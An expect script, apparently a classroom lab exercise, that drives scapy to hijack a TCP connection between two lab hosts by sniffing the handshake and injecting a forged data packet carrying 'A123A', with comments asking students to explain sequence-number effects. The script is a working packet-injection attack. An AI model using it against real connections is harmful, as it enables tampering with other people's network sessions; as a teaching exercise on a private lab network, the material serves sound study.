#!/usr/bin/expect
#
# Author: M. Dacier
# January 2022

spawn "/usr/bin/scapy";
expect ">>> ";

# PAY ATTENTION TO escape the following chars: " [ and ]

# Trivial script to hijack a connection between s3.net3.local and s2.net2.local
# You must first launch "nc -l 3000" (or another port) on s2
# Then you launch this script ./sniff.exp
# Then you try to connect from s3 to s2: "nc s2.net2.local 3000" (or whatever other port you had chosen)

# Result: the string A123A will appear in s2's terminal but it has been sent from c3, not from s3
# Try to enter the string B123BCDEF into s3 terminal and, in s2, you will see CDEF appearing next to A123A
# Why ?

# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully

# Redo the experiment but, this time,
# what happens if you enter "B123" into s3 instead of "B123BCDEF" and, then, "BCDEF".  Why ?
# Redo the experiment but, this time,
# what happens if you enter "B1" into s3 instead of "B123BCDEF" and, then, "23BCDEF".  Why ?

# Hint: check the packets in Wireshark, the sequence and acknowledgment numbers in particular, carefully

send "cap = sniff(filter=\"tcp and host 10.10.10.54 and host 20.20.20.55\", count=3) \r" 

send "syn=cap\[0\].copy()\r"
send "synack=cap\[1\].copy()\r"
send "ack=cap\[2\].copy()\r"

send "data=ack.copy() \r"
send "data=data / Raw(load=\"A123A\") \r"
send "del data\[TCP\].chksum \r"
send "del data\[IP\].chksum \r"
send "del data\[IP\].len \r"
send "sendp(data) \r"


# This last command enables us to stay within scapy to type more commands
# interactively, if we so desire.

interact


